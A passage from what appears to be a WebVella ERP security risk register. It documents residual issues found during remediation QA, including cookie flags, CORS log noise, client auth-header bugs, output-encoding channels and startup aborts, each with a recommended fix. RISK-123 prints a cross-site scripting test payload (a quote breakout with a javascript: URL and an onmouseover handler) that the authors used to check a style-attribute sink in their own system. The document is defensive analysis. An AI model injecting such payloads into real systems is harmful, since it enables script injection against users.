every documented-only risk, so it is recorded here in full, with its measurement and its fix, and
cross-referenced from the index.

## Detailed entries — observations surfaced by the Phase 7 runtime validation pass

The two entries below were surfaced by driving a published `WebVella.Erp.Site` host in `Production` through a
real browser while verifying the `API-01` compatibility wrappers and the seven mandated response headers.
Neither is a regression introduced by this remediation, and neither is in any finding's cited range, so both
are recorded rather than fixed, per AAP 0.1.3 guideline 8. Both are stated at the strength the evidence
actually supports.

### RISK-069 — the TempData cookie is the one cookie left at framework defaults

| Field | Value |
| --- | --- |
| **Status** | Documented — out of scope under AAP 0.1.3 guideline 8. |
| **Related finding** | Adjacent to `H-15` (CWE-614), whose cookie half hardened the authentication cookie, and to `M-02`, whose zero-breakage half hardened the antiforgery cookie. |
| **Owner** | Platform team |

Observed on the wire, on both `GET /login` and the login `POST`, in `Production` over HTTPS:

```
set-cookie: .AspNetCore.Mvc.CookieTempDataProvider=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; samesite=lax; httponly
```

`HttpOnly` and `SameSite=Lax` are present; **`Secure` is not.** The contrast is what makes this worth
recording rather than ignoring: outside Development, `ErpMvcExtensions` pins the antiforgery cookie to
`CookieSecurePolicy.Always`, and the shared cookie configurator pins the authentication cookie to
`SecurePolicy.Always` unconditionally. The Development-only antiforgery carve-out uses `SameAsRequest`;
the TempData cookie is still the one cookie the platform emits that was never brought under either
explicit policy. No `CookieTempDataProvider` options are configured anywhere in the repository, so it
inherits the framework default of `CookieSecurePolicy.None`.

**What is actually exposed, stated precisely.** In the flow observed, nothing: the directive carries an
**empty value** and an epoch expiry, so it is a deletion instruction and no data travels on it. It would be
wrong to describe the observation itself as an exposure. The reason it is not dismissed outright is that
`TempData` is *genuinely in use* elsewhere in the platform — the `ScreenMessage` pattern writes to it from
the SDK, Mail and Project plugins and from the hook samples, and
`ScreenMessageViewComponent` reads it back — so a **non-empty** set of this cookie does occur on those
screens, and that set would carry the same missing attribute. The content is a UI status message rather than
a credential or a session token, which is why this is Low and not a finding.

**Why it is out of scope here.** It falls in no finding's cited range; `H-15`'s cited evidence is the
authentication cookie options block, and `M-02`'s remediated half is explicitly the antiforgery cookie. AAP
0.3.2 confines this remediation to confirmed findings, and adding a fourth cookie to the policy would be
hardening beyond the audit rather than closing an audited weakness.

**Recommended fix.** One options block alongside the existing two, in the same shared registration extension
so a single edit reaches all seven hosts:

```csharp
services.Configure<CookieTempDataProviderOptions>(o =>
{
    o.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    o.Cookie.HttpOnly = true;
});
```

Then re-verify a screen that actually writes `TempData` — the SDK field-creation page is the clearest, since
its comment records that it uses `TempData` deliberately — and confirm the status message still survives the
redirect. Note that pinning `Always` means the message is silently dropped over plaintext HTTP, which is
already true of sign-in, so the behaviour is consistent rather than newly surprising.

### RISK-070 — the global CORS policy evaluates page POSTs, so same-origin logins log a failure that is not one

| Field | Value |
| --- | --- |
| **Status** | Documented — out of scope under AAP 0.1.3 guideline 8. |
| **Related finding** | A side effect of the `H-14` remediation (CWE-942), which replaced `AllowAnyOrigin()` with an explicit allow-list. |
| **Owner** | Platform team |

Observed in the `Production` host log during a **successful** login:

```
info: Microsoft.AspNetCore.Cors.Infrastructure.CorsService[4]
      CORS policy execution failed.
info: Microsoft.AspNetCore.Cors.Infrastructure.CorsService[6]
      Request origin https://127.0.0.1:5111 does not have permission to access the resource.
```

The very next lines in the same request are `AuthenticationScheme: Cookies signed in.` and a `302`, so the
request was **not** blocked.

**Why it happens, and why it is not a defect.** `WebVella.Erp.Site/Startup.cs` registers an
`AddDefaultPolicy` allow-list of `http://localhost:3333`, `http://localhost:3000` and `http://localhost`, and
applies it with a bare `app.UseCors()` at `L326`, deliberately placed ahead of static files so assets are
covered. Because the default policy is applied globally rather than scoped to a path prefix, the CORS
middleware evaluates *every* request, including top-level Razor Page form submissions. Chrome attaches an
`Origin` header to same-origin form POSTs, and `https://127.0.0.1:5111` is not on the allow-list — the
deployment's own origin never is, because same-origin requests do not need to be. CORS does not gate
top-level navigation form POSTs, so the policy result is computed, found not to match, logged, and then
correctly has no effect on the request.

**What the real risk is.** Not access control — it is **diagnostic**. A genuine cross-origin denial produces
these same two `info` lines, so the signal a reviewer would use to detect a misconfigured allow-list is
buried in noise generated by ordinary, successful logins. The second-order risk is a maintainer "fixing" the
noise by adding a wildcard origin and thereby reopening `H-14`.

**Recommended fix, in order of preference.** First choice: scope the middleware so it stops evaluating page
requests, by applying the policy on the API branch only rather than globally — this removes the noise at its
source and narrows the CORS surface at the same time. Second choice: leave the ordering alone and add the
deployment's own origins to the allow-list from configuration, which silences the lines without narrowing
anything. Either way, **do not** widen the policy with `AllowAnyOrigin()`, and re-verify after any change
that cross-origin preflight still succeeds for the listed origins with HTTPS redirection enabled — the AAP
records that HTTPS redirection breaks preflight with an invalid-redirect error, which is why
`WebVella.Erp.Site/Startup.cs` documents its redirection call as deliberately ordered *after* `UseCors()`.

### RISK-071 — the pre-existing developer documentation has 74 unresolved relative links

| Field | Value |
| --- | --- |
| **Status** | Documented — pre-existing and out of scope under AAP 0.1.3 guideline 8. |
| **Related finding** | Adjacent to `L-08`, which records service-catalogue drift in `catalog-info.yaml`. This is a *different* drift and is **not** covered by that record. |
| **Owner** | Platform team |

Surfaced by the Phase 7 validation link sweep, which was run to prove the *new* security documentation
resolves. It does — the nine documents this remediation authored or edited contain **252** relative links and
**0** unresolved ones, and all **6** `mkdocs.yml` navigation entries resolve. The sweep then widened to the
whole `docs/` tree and found the pre-existing pages do not.

**The measurement.** Across the full documentation set, **64 files** carry **74** unresolved relative links,
in two distinct shapes:

* **29 root-absolute image links** of the form `/doc-images/sdk-application-list.png`. There is no
  `docs/doc-images` directory anywhere in the repository, so these do not resolve on the filesystem *or* at
  the published site root. The referenced screenshots are simply absent.
* **45 extension-less cross-references** of the form `docs/developer/tag-helpers/wv-field-base` — missing the
  `.md` suffix *and* written as though the reader were at the repository root, while the linking page itself
  lives in `docs/developer/tag-helpers/`. The correct target exists; only the reference is wrong.

**Why this is recorded and not fixed.** Three independent reasons, and the first is sufficient on its own.
Every one of the 64 files is **untouched by this remediation** — verified by intersecting the affected file
list with `git diff --name-only origin/master`, which yields the empty set. Repairing them would add 64
files to a change surface that review findings `BOUNDARY-01` and `BOUNDARY-02` already criticise for being
too wide, which would make the very problem those findings raise worse. Second, a broken documentation link
is not a security weakness: it discloses nothing, grants nothing and is reachable by anyone who can already
read the public repository. Third, AAP 0.1.3 guideline 4 forbids improvement beyond remediation, and
guideline 8 directs that out-of-scope concerns be documented rather than fixed unless Critical.

**Recommended fix, for the documentation sprint rather than a security one.** Two mechanical passes, each
independently verifiable. Restore or regenerate the missing screenshots into `docs/doc-images/` — or, if they
are gone for good, remove the 29 dead image references so the pages stop rendering broken-image icons. Then
rewrite the 45 cross-references as page-relative links with the `.md` suffix, for example
`wv-field-base.md` in place of `docs/developer/tag-helpers/wv-field-base`. Afterwards, add the sweep itself
to the existing security workflow as a non-blocking step so the count cannot silently grow: the check is a
short script that resolves every non-`http` markdown link against the filesystem and prints the unresolved
ones. Keeping it non-blocking matters — promoting a 74-item pre-existing backlog to a build error would
demand exactly the mass edit this entry declines.

#### RISK-119 — Two pre-existing defects in the WebAssembly client's HTTP layer

**How they were found.** Both surfaced while remediating review finding `B3-SEAM-01`, which required reading
the shipped Blazor WebAssembly client's authentication path end to end. Neither is that finding, neither is
caused by its fix, and neither is repaired by it. They are recorded here because AAP 0.1.3 guideline 8
directs that out-of-scope concerns be documented rather than fixed unless Critical, and because the review
that raised `B3-SEAM-01` listed both under its areas of concern while placing them outside the finding's
scope.

**Defect one — the client's token refresh addresses a route that does not exist.**
`WebVella.Erp.WebAssembly/Client/Services/TokenManagerService.cs` holds its refresh endpoint as
`api/v3/en_US/auth/jwt/token/refresh`. The `HttpClient` it is resolved against is configured with a
`BaseAddress` of the server URL plus `api/`, so the effective request path carries the segment twice —
`…/api/api/v3/en_US/auth/jwt/token/refresh` — which no route on any host serves. The client's automatic
refresh therefore cannot succeed; it fails as a not-found rather than as a rejected credential. Every
sibling in the same client gets this right by holding the path *without* the `api/` prefix, which is the
shape `LoginAsync` and the `B3-SEAM-01` logout call both use.

**Defect two — a lower-case scheme on a shared client.** `WebVella.Erp.WebAssembly/Client/ApiService/ApiService.System.cs`
assigns `new AuthenticationHeaderValue("bearer", token)` to `_httpClient.DefaultRequestHeaders.Authorization`.
Two separate problems live in that one line. The scheme is lower-case, and both hosts that issue tokens
select which authentication handler sees a request by matching the `Authorization` prefix
case-**sensitively**, so the request is routed to the cookie handler and is never authenticated as the
bearer session it presents. And the assignment is to `DefaultRequestHeaders` rather than to a single
request, so the credential stays attached to a client shared with every other call the application makes,
including ones that should carry no credential at all.

**Why neither is escalated.** Neither grants access that was previously refused, discloses anything, or
weakens a control: the first is a request that cannot reach a route, and the second causes a request to be
*less* authenticated than intended, not more. Under the severity matrix neither reaches Critical or High, so
the minimal-change constraint governs and the correct disposition is documentation. Repairing them would
also mean changing client behaviour that no finding asked to change, in a project the plan's scope note
excludes except where a finding makes a change unavoidable — which, unlike `B3-SEAM-01`, these do not.

**Why they do not undermine the `B3-SEAM-01` fix.** The logout request built in
`Client/Services/AuthenticationService.cs` inherits neither defect, deliberately. It composes its own path
from the `apiAuthRoot` constant without an `api/` prefix, so it is not affected by the doubled segment; and
it attaches a correctly-cased `Bearer` header to a single `HttpRequestMessage` rather than to
`DefaultRequestHeaders`, so it is both routed to the bearer handler and unable to leak the retired
credential onto later requests. The reasoning is stated in comments at both lines so that a future edit
cannot quietly reintroduce either shape.

**One consequence for verification, worth stating explicitly.** Because the client's own refresh helper
cannot reach the server, a verification that drove refresh *through the client* would report a failure for
the wrong reason and could be mistaken for proof that revocation works. Gate 5's `M19` procedure therefore
directs the tester at the server route `POST api/v3/en_US/auth/jwt/token/refresh` directly, so that a
refusal is attributable to the revoked session rather than to a malformed path.

**Impact proven at runtime, and it is larger than that one line suggests.** Browser verification of the
`B3-SEAM-01` fix established that defect two does not merely leave individual calls unauthenticated. On
either token-issuing host it prevents the client's home page from ever presenting its authenticated branch,
and that branch holds the client's **only** logout control. The chain is short and entirely pre-existing.
`Client/Pages/Index.razor.cs` sets `_isAuthenticated` from token presence alone, which succeeds, and then
calls `GetCurrentUserAsync()` on the following line before it re-renders. That call resolves its client
through `GetAuthorizedHttpClientAsync()`, so it carries the lower-case scheme, is routed to the cookie
handler, is answered with an authentication redirect, and throws. The throw happens *before*
`StateHasChanged()`, so the page goes on rendering the stale anonymous branch even though the field now says
otherwise — and `Client/Pages/Index.razor` dereferences `@_user.Email` unguarded, so a re-render with a null
user would fault as well. Observed in the browser as an alternating redirect loop terminating in
`ERR_TOO_MANY_REDIRECTS`, surfaced to the user as nothing at all, because the framework's error banner is
commented out of the client's `index.html`.

Two consequences follow, and both are worth stating plainly. The screen reads as signed-out while a live,
unrevoked administrator token is still held in local storage: a misleading signal rather than a
vulnerability, since the token is one a successful login legitimately minted and it expires on its own
schedule. And the shipped Logout button cannot be clicked on a stock build, so a browser verification of
`B3-SEAM-01` must reach the fixed code through the client's library entry point `IApiService.LogoutAsync()`,
or correct the scheme casing first, rather than through that button. `M19` is worded to permit exactly that.

**A note on which side of this is actually wrong.** RFC 7235 section 2.1 defines the `auth-scheme` token as
case-insensitive, so the client's lower-case `bearer` is legal and the hosts' case-**sensitive**
`StartsWith("Bearer ")` prefix match is the non-conforming half. That match has been in place since June
2022 and was not introduced, moved or relied upon by this remediation. Either side can be corrected. The
one-token client change below is the smaller and is the one recommended; a maintainer who instead made the
two host selectors compare case-insensitively would be repairing the more defective side and would fix every
client at once. Neither change is a security fix, and neither is made here.

**Recommended fix, for a maintenance sprint rather than a security one.** Two one-line changes, each
independently verifiable. Drop the `api/` prefix from the refresh endpoint constant so it matches every
other path in the client, then confirm a refresh returns a token rather than a not-found. Capitalise the
scheme to `Bearer` and move the assignment off `DefaultRequestHeaders` onto the individual request, then
confirm a protected call is authenticated as the bearer principal rather than falling through to the cookie
handler. Fixing the second will make previously-unauthenticated client calls start authenticating, so it
should be validated against the client's protected screens rather than assumed to be inert.


## Detailed entries — residuals from the frontend QA pass on the output-encoding remediation

The three entries below come from a QA pass that exercised the remediation in a real browser rather than
reading it. That pass raised 35 findings. Two were acted on and are recorded in
[the audit report](security-audit-report.md) as `P-21` and `P-22`; a third, the incomplete coverage of the
`H-06` allow-list, was acted on as part of the same class. The remainder are here.

#### RISK-120 — The page header's `description` channel is raw by design, and one caller keeps it that way

**Status: accepted, by design. The exploitable half is fixed.**

`WvPageHeader` renders eight values. Seven are text and are now encoded (`P-21`). The eighth,
`Description`, is markup, and encoding it would break a working feature on every list screen in the product:
its only non-literal supplier, `PageUtils.GenerateListPageDescription`, composes
`<ul class="list-inline"><li class="list-inline-item">…</li></ul>` wrapping a bold `<strong>sorted by</strong>`
and `<strong>filtered by</strong>`. Encoded, a user would see those tags as literal characters.

This is the same shape as `RISK-023`, and it is recorded separately because its resolution is different.
`RISK-023`'s four channels are remediated by compensating control alone. Here the exploitable half was
genuinely closed: the two attacker-influenceable values the builder interpolates — the `sortBy` query value
and each filter name — are encoded **at the builder**, where they are still distinguishable from the markup
around them. What cannot be closed is the structural fact that the channel is raw, and therefore that a
future caller passing untrusted text into `description` would reintroduce the sink.

**What guards it.** Two things, neither of which is a compiler check and both of which are stated so a
reader knows what they are relying on. The sink in `WvPageHeader.cs` carries a comment that forbids
converting it to `Append`, names its upstream supplier, and explains that the fix belongs at the builder.
And the encoding is applied at the only point where the two are separable, so the correct pattern is
demonstrated in the codebase rather than only described here.

**Recommended fix, for a future sprint rather than now.** Change `GenerateListPageDescription` to return a
structured result — a record carrying the count, the optional sort term and the filter names as *data* —
and move the markup composition into a Razor partial, so the tag helper never receives a pre-composed HTML
string at all. That removes the raw channel instead of guarding it. It is out of scope here because it
changes a public signature used by nine list page models, which is refactoring beyond the security fix.

#### RISK-121 — The Track Time grid title is sanitised by a third-party tag allow-list, not encoded

**Status: named, not fixed. Third-party component; non-exploitable as measured.**

QA finding `F-AA` enumerated four render paths consuming the same hostile priority metadata. Three were
closed in the remediation — the queue widget was already guarded, and the priority chart and the Track Time
grid **icon** are now guarded through `SafeStyleValue` and `TaskService.GetTaskIconAndColor`. The fourth is
the grid's **title** cell, which passes its value through a tag allow-list that produces genuine `<b>`
elements rather than encoding them.

*A note on that count, so this entry is not read as complete.* `F-AA`'s four were the paths **that pass had
found**; a later cross-cutting pass found a **fifth** — the platform-wide select conversion boundary — which
is recorded and closed as `RISK-127`. This entry concerns only `F-AA`'s title cell, and the rationale below
is confined to it. In particular, the *"QA measured nothing exploitable"* reasoning holds for **this** sink
and was explicitly found **not** to extend to the fifth one, where a live injected attribute was measured.

**Why it is not changed.** There is no grid-rendering source in this repository to change: `wv-grid` ships
inside the third-party `WebVella.TagHelpers` 1.8.0 package, and the plan restricts third-party code to
version updates. Independently of scope, a tag allow-list that emits `<b>` while stripping `<script>` is a
sanitiser behaving as specified, not a missing control. QA measured the outcome rather than inferring it: no
dialog fired, no live event handler existed, a `javascript:` scheme inside a CSS `url()` was inert, and every
hostile rectangle measured 0 × 0.

**Residual, stated plainly.** A user who can set a task subject can cause a small set of formatting tags to
render inside that grid cell. That is a presentation-integrity issue, not script execution.

**Recommended fix.** Raise it with the tag-helper library rather than working around it: request an opt-in
`encode-text` mode on the grid column so a consumer can choose encoding over sanitisation. Until then, a
consumer-side option is to project the column through a server-side encode before it reaches the grid, which
would need one call site per column and is why it is not done pre-emptively.

#### RISK-122 — The 33 remaining frontend QA findings, and the recommended fix for each

**Status: documented for a future sprint.**

The QA pass raised 21 Minor and 12 Info findings beyond the three that were acted on. Every one is
pre-existing in code this remediation never touched, and every one carries a git-level counterfactual: an
unmodified stylesheet, an unmodified chart component, an unmodified pager, an unmodified third-party widget,
or a nav markup diff whose every added line is a comment.

**Why they are declined rather than fixed.** The governing plan is explicit and its constraints are
acceptance criteria, not preferences: *minimal code changes only*; *no feature additions or enhancements*;
*no refactoring beyond security requirements*; *third-party code and vendor libraries — version updates
only*; *fix only what is confirmed*, with no speculative hardening; and no change motivated by feature
value, developer convenience or code aesthetics. Accessibility and layout defects in unmodified files meet
none of the tests that bring work into this scope. The QA pass reached the same conclusion independently,
recording its own out-of-scope boundary as *"other documented-only Medium/Low issues"*.

They are recorded here because the plan's fourth objective requires every documented finding to carry an
actionable fix rather than a generic caution.

**Accessibility — the largest and most coherent group, and the one worth scheduling first.**

| Finding | Measured | Recommended fix |
| --- | --- | --- |
| No visible focus indicator | 71 of 90 focusable elements | Add a single `:focus-visible` rule to `button-colors.css` with a 2px outline and offset; one declaration covers the whole product because the buttons are already class-driven |
| Interactive elements reach assistive tech unnamed | 41 of 90 tab stops | The product uses `title` as its naming strategy, which surfaces as *description* rather than *name*. Add `aria-label` alongside `title` in the tag helpers that emit icon-only controls |
| No `h1` and no `<main>` landmark on any screen | every screen | Promote the page-header title element to `h1` inside `WvPageHeader`, and wrap the body region of `_AppMaster.cshtml` in `<main>`. Two edits, both in shared files |
| Colour contrast below AA, including both primary button labels | 2.78:1 and 3.12:1 | Darken the two primary button backgrounds in `button-colors.css` until the white label reaches 4.5:1 |
| Arrow keys inert; Space cannot open the settings menu | 5 confirmations | The nav script binds `click` only. Add a `keydown` handler mapping Enter, Space and the arrow keys onto the existing click path |
| `label for` targets the wrong element id | `input-{guid}` versus `textarea-{guid}` | Derive the `for` value from the element that is actually rendered, in the field tag helper that emits both shapes |
| Tab order jumps backwards ~1126px | pager component | The pager's DOM order is float-reversed. Reorder the markup and keep the visual order with `flex-direction: row-reverse` |
| Third-party select widget announces its own value as its name; the labelled native select is 1×1px with `tabindex=-1` | third-party | Out of reach without a library change; raise upstream |
| Third-party select's open panel clips the selected option | third-party | Raise upstream |
| Grid has no accessible name, no `th[scope]`, no `aria-sort`; 15 row actions indistinguishable | third-party grid | Raise upstream; the shipped views cannot add these attributes |
| Tap targets below 44 × 44 | 90 of 91 elements, though Lighthouse's `target-size` audit passes on mobile | Increase padding in the shared button and icon-button classes; measure against the Lighthouse audit rather than the raw count |

**Responsive and visual layout.**

| Finding | Measured | Recommended fix |
| --- | --- | --- |
| Horizontal overflow on the data-source list at ≤1024px | 67-character `target` column, no `.table-responsive`; does **not** reproduce on the pages list | Wrap that grid in `.table-responsive`; `grep -c table-responsive` returns 0 across the tree, so this is a product-wide gap rather than one screen's |
| Timesheet table overlaps a sibling card and an alert at 768px | 2008 px² and 1386 px² | Same fix, same wrapper |
| Production error page: 390px overflow, Quirks Mode, zero stylesheets | `error.cshtml` has `Layout=""`, a hardcoded `width:500px` and no doctype | Add a doctype and a minimal inline stylesheet. Deliberately keep it layout-free and self-contained so it cannot itself fail — that is why it looks the way it does |
| No mobile nav collapse; the Logout control sits off-screen at 390px | nav markup byte-identical to origin | Add the Bootstrap navbar collapse markup the theme already ships CSS for |
| Escape does not close the search drawer; no focus trap | 0 of 1,152,000 pixels changed by the remediation | Add a `keydown` Escape handler and a focus trap to the drawer component |
| Login-page markup nits | mislabelled field, missing `autocomplete` | Add `autocomplete="username"` and `autocomplete="current-password"`, and correct the `for` attribute |

**Data presentation and correctness.**

| Finding | Measured | Recommended fix |
| --- | --- | --- |
| All four charts render with `labels:[]`, `legend.display:false`, `tooltips.enabled:false` | 3 chart components, 0 changed files | Populate `labels` from the series names already available in the component, and enable the legend and tooltips |
| Two widgets disagree about the same task's overdue state | 1 versus 2 | A genuine off-by-one in unmodified code: `TaskDistribution` compares `AddDays(1) < DateTime.Now.Date` (midnight) while `TasksChart` compares `< DateTime.Now`, so a task due exactly yesterday is never "overdue" in one of them. Extract one shared predicate and call it from both |
| No length or format validation on names; a 300-character name round-trips into a URL segment | no `maxlength`, no `pattern`; the server validates presence only | Add `maxlength` and a server-side length bound to the create and manage models. **Note the security-relevant edge:** the value reaches a URL segment, so bound it server-side, not only in markup |
| Entity metadata is fragile to JSON key reordering | `$type` must stay first | Configure the serialiser to emit `$type` first explicitly, or read it positionally-independently. This is the defect that broke login during the QA pass when a fixture write round-tripped the column through `jsonb` |

**Environment and build, not application defects.**

| Finding | Measured | Recommended fix |
| --- | --- | --- |
| Task details and two SDK list screens return HTTP 500 on Linux | `TimeZoneNotFoundException: 'FLE Standard Time'`, then `FileNotFoundException: /usr/share/zoneinfo/Europe/Kiev`, thrown inside third-party `WebVella.TagHelpers.WvFieldDateTime` | Two independent remedies, either sufficient: set `Settings:TimeZoneName` to an IANA identifier such as `Europe/Sofia`, which the deployment guide already documents; or install a tzdata build that still carries the pre-rename `Europe/Kiev` alias. The literal Windows identifier lives in the unmodified vendor DLL, so the application cannot fix it |
| `/projects/dashboard/dashboard/a` returns 500 on 7 of 8 hosts | those hosts carry no `ProjectReference` to `WebVella.Erp.Plugins.Project`, in **either** the current tree or origin; all 17 changed project files audited and no reference count changed | Either add the reference to the hosts that expose the route, or remove the sitemap entry from hosts that do not load the plugin. This is a product packaging decision, not a security one |
| A stale QA seed avatar returns 404 | `/fs/qa/avatar-ann.png`, with a working `assets/avatar.png` fallback | Test-data residue from the QA pass, disclosed by that pass. Delete the row or upload the file |
| Two vendored source-map files return 405 | requested only by developer tools | Cosmetic; see `RISK-019` |
| No HTML response compression; missing meta description and crawlable anchors; a 16×16 logo fails the mobile responsive-image audit | Lighthouse best-practice and SEO audits, costing exactly 4 points | Enable HTML in the existing response-compression configuration and supply a larger logo asset. None is a security finding |

**One further item, recorded because it borders on security rather than because it is one.** A return URL
with leading whitespace is accepted after trimming and resolves to an arbitrary **same-origin** path. That
is the framework's own documented `IsLocalUrl` behaviour, which `PageUtils.GetSafeReturnUrl` deliberately
mirrors so its behaviour is auditable against a recognised reference implementation. Browsers ignore
leading whitespace when resolving a URL, so `" /valid/path"` is a legitimate value that must keep working.
No cross-origin navigation is reachable, and the QA pass confirmed the browser never left the origin.
Nothing to fix; recorded so a future scan hit is not misread.

#### RISK-123 — Administrator-authored colour and icon metadata reaches a style attribute as CSS

`WvPageHeader` exposes nine `string` properties. Six now carry no exposure: `area-label`, `area-sublabel`,
`title` and `subtitle` are HTML-encoded at the sink as of `P-21`, `description` is the raw-by-design channel
of `RISK-120`, and `return-url` passes through `BaseErpPageModel.SanitizeReturnUrl` before it becomes an
`href`. The remaining three are this entry: `color` and `icon-color` are interpolated into a `style`
attribute, and `icon-class` is appended to a `class` attribute:

```
metaLabelIconWrapperEl.Attributes.Add("style", $"background-color:{Color};");
metaLabelIconEl.Attributes.Add("style", $"color:{IconColor};");
metaLabelIconEl.AddCssClass(IconClass);
```

Consumer views bind all three from the database rather than from literals — `color="@Model.ErpEntity.Color"`
at 15 sites, `icon-class="@Model.ErpEntity.IconName"` at 11, `color="@Model.App.Color"` and
`icon-class="@Model.App.IconClass"` at 4 each — so the values are administrator-authored entity and
application metadata, not compile-time constants.

**What was measured, rather than assumed.** The `color` of the `account` entity was replaced with
`#f44336;background:url(javascript:alert(1))" onmouseover="alert(9)`, a payload deliberately carrying both a
quote-breakout attempt and a quote-free CSS declaration. The entity-detail page delivered:

```
style="background-color:#f44336;background:url(javascript:alert(1))&quot; onmouseover=&quot;alert(9);"
```

The double quote is encoded to `&quot;`, so the `onmouseover=` text is trapped **inside** the `style`
attribute value as inert characters: no attribute is created and no handler is registered. `TagBuilder`
encodes attribute values on render, which removes the entire handler-injection class from this channel. The
CSS declaration survives verbatim, because it contains no HTML-special character for that encoder to act on.
The fixture was reverted and the stored metadata verified byte-identical to its backup — 10,721 bytes,
equal after parsing, key order preserved.

**Why it is documented rather than remediated.** Three reasons, in order of weight. It is not a
script-execution sink: `javascript:` inside a CSS `url()` is inert in every current browser, and the
report-only Content-Security-Policy already reports a `default-src` violation for any off-origin
`url(...)` an author might substitute instead. It is privilege-gated to exactly the tier `RISK-023` already
accepts — an author who can set an entity's colour can equally author a raw HTML block, so constraining the
colour while leaving `PcHtmlBlock` raw would buy nothing. And a sanitiser here would have to police a
property whose legitimate values are arbitrary CSS colours, across the 34 bindings confirmed rendering
correctly during runtime verification; the plan's instruction to fix only what is confirmed, and to prefer
the least invasive control, both point away from that.

**Recommended fix, when the platform team chooses to close it.** Validate `color` and `icon_color` against
a CSS-colour allow-list — a `#`-prefixed 3-, 6- or 8-digit hex value, or a member of the CSS named-colour
set — and `icon_class` against the icon-token pattern already used by `SafeStyleValue.IconClass`. That
helper is the working precedent: it is an allow-list that drops a non-conforming value whole while passing
legitimate `fa`/`fas` tokens through unchanged, and runtime verification confirmed it preserves two distinct
glyphs and two distinct colours from the same code path. **This recommendation's first half has since been
carried out for a different finding and is no longer pending:** closing `RISK-127` promoted the helper out of
`WebVella.Erp.Plugins.Project` into `WebVella.Erp.Web/Utils/SafeStyleValue.cs`, so it is now callable from
the framework itself. What remains for this entry is applying it at these three page-header interpolations,
which needs no further groundwork and would touch no consumer view.
## Detailed entries — residuals and observations from the runtime-configuration QA pass

The three entries below were opened by runtime QA of the configuration and deployment surface. One is a
bounded residual of the transport-security check added in that pass; the other two are observations that
runtime validation made concrete and that the modification boundaries keep out of code.

#### RISK-124 — Configuration aborts surface as an unhandled exception, so an orchestrator sees a crash

| Field | Value |
| --- | --- |
| **Status** | Accepted — documented with fix guidance |
| **Related finding** | Runtime QA observation on the fail-fast surface; applies to C-04, H-04, H-05 and the transport-security check |
| **Owner** | Platform team |

**What was observed.** Every required-configuration abort behaves the same way: the host writes the
actionable message, then a stack trace of roughly thirty frames, and the process ends with exit status
**134** (`SIGABRT`, reported by shells as "Aborted"). The abort is raised from `Startup.Configure` —
`ErpSettings.ValidateRequiredSecurityConfiguration`, `CryptoUtility.CryptKey`, the
`SecurityHeaders:ContentSecurityPolicyReportOnly` binding, and `ValidateTransportSecurityPosture` all
throw — and the seven hosts' `Program.Main` calls `.Run()` without catching, so .NET's default
unhandled-exception path terminates the process.

**Why it is accepted rather than fixed.** The behaviour is fail-closed and leaks nothing: measured
across five live negative starts, the process never served a single HTTP request, and no configuration
*value* appeared in the output — only key names. Making it a clean single-line non-zero exit means
wrapping `Main` in all seven hosts plus the console application in a `try`/`catch`, deciding which
exception types are "configuration" faults, and suppressing the stack trace for them. That is
error-handling redesign across eight entry points with no vulnerability behind it, which the audit
plan's boundaries exclude (no refactoring beyond security requirements; fix only what is confirmed).

**Operator guidance, which is the actionable half.** Every abort message begins with the marker
`WebVella ERP startup aborted` and is written in full **before** the first stack frame, so triage never
needs the trace. This filter recovers it — verified against both a transport abort and a missing-secret
abort:

```bash
docker logs <container> 2>&1 \
  | sed -n '/WebVella ERP startup aborted/,/^[[:space:]]*at /p' \
  | grep -v '^[[:space:]]*at '
```

Expect the message up to **three** times: once as `Application startup exception`, once inside the
`Microsoft.AspNetCore.Hosting.Diagnostics` critical entry, and once in the unhandled-exception dump. Any
one copy is complete; they are the same string. An exit status of 134 from one of these hosts should be
read as "configuration fault, message above", not as a runtime crash. If a future change does introduce
a top-level handler, it must keep two properties this behaviour already has: the message must remain
complete, and no configuration value may be echoed (CWE-532).

#### RISK-125 — The login inputs carry no `autocomplete` attributes

| Field | Value |
| --- | --- |
| **Status** | Recommended, not fixed — out of remediation scope |
| **Related finding** | Runtime QA observation (browser autofill advisory) |
| **Owner** | Frontend maintainer |

**What was observed.** Loading `/login` in Chrome produces one verbose console entry —
`[DOM] Input elements should have autocomplete attributes (suggested: "current-password")` — and one
DevTools issue, `An element doesn't have an autocomplete attribute`. They are the only two non-CSP
console entries on the page; there are zero errors and zero warnings.

**Why it is not fixed here.** `autocomplete` is **absent, not disabled**. The weakness pattern OWASP
warns about is `autocomplete="off"` on credential fields, which suppresses password managers; nothing
suppresses anything here. Adding `autocomplete="username"` and `autocomplete="current-password"` is a
usability improvement with no confirmed vulnerability behind it, and the audit plan's modification
boundaries are explicit on both counts — no feature additions or enhancements, and fix only what is
confirmed. The login **view** is also not among the files the plan places in scope; only its page model
is.

**Recommended fix, when a frontend change is in scope.** On `WebVella.Erp.Web/Pages/login.cshtml`, add
`autocomplete="username"` to the email input and `autocomplete="current-password"` to the password
input. Both advisories then disappear and password-manager behaviour improves. Nothing else changes:
the fields keep their names, so the form post and the antiforgery contract are untouched.

#### RISK-126 — The transport-security check reports, rather than refuses, when no endpoint is declared

| Field | Value |
| --- | --- |
| **Status** | Accepted — bounded residual of the control |
| **Related finding** | The QA finding that a plaintext-only Production host answered HTTP 500 on every form-bearing page |
| **Owner** | Platform team |

**The control.** `ValidateTransportSecurityPosture` in `WebVella.Erp.Web/ErpMvcExtensions.cs` runs
inside `UseErp()`, so all seven hosts inherit it, and it accepts any one of four pieces of evidence that
a request can arrive over HTTPS: a declared endpoint whose scheme is `https`; a `Kestrel:Endpoints`
entry whose `Url` is `https`; a public HTTPS port in `HTTPS_PORT` (`ASPNETCORE_HTTPS_PORT`,
`HTTPS_PORT`, or the configuration key `https_port`); or a trusted reverse proxy declared through
`Settings:ForwardedHeaders:KnownProxies`/`KnownNetworks`. With a declared endpoint, none of those
signals, and a non-Development environment, the host aborts before serving anything.

**The residual.** The refusal fires only when at least one endpoint was **declared** —
`ASPNETCORE_URLS`, `UseUrls` or a host binding, all of which reach `IServerAddressesFeature.Addresses`
before the pipeline is built. When nothing is declared, the endpoints are chosen by Kestrel's own
defaults or by host code this check cannot inspect, so the identical diagnosis is written as a `warn:`
line and startup continues. Measured on a published Production host with no `ASPNETCORE_URLS` at all:
Kestrel bound `http://localhost:5000` alone and `/login` still answered **500**. The warning is therefore
a notice, not a clean bill.

**Why the boundary is drawn there.** A check that aborts a deployment which would have worked is worse
than the failure it prevents, and "no declaration" genuinely is an unknown posture rather than a known
bad one — a fork that binds endpoints in code would be refused on a correct configuration. Development
also stays on the reporting path, but for a different reason: its antiforgery cookie uses
